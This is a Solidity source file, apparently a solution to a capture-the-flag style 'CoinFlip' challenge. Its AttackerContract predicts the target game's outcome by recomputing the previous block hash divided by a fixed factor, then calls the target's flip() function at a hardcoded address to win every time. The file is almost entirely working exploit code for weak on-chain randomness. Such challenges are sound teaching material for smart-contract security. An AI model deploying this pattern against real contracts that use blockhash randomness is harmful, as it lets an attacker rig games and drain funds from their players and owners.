// SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}
contract AttackerContract {
    // simulate on-chain rng to guess the right answer and win the game, which requires 10 consecutive wins to complete the challenge
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address CoinFlipAddress = 0x6ce8516Da72169598F6f8f2864c4cd19f5DD7fD7;
    function guessRightFlip() external {
        uint256 side = uint256(blockhash(block.number - 1)) / FACTOR;
        bool _guess = side == 1 ? true : false;
        CoinFlip(CoinFlipAddress).flip(_guess);
    }
}
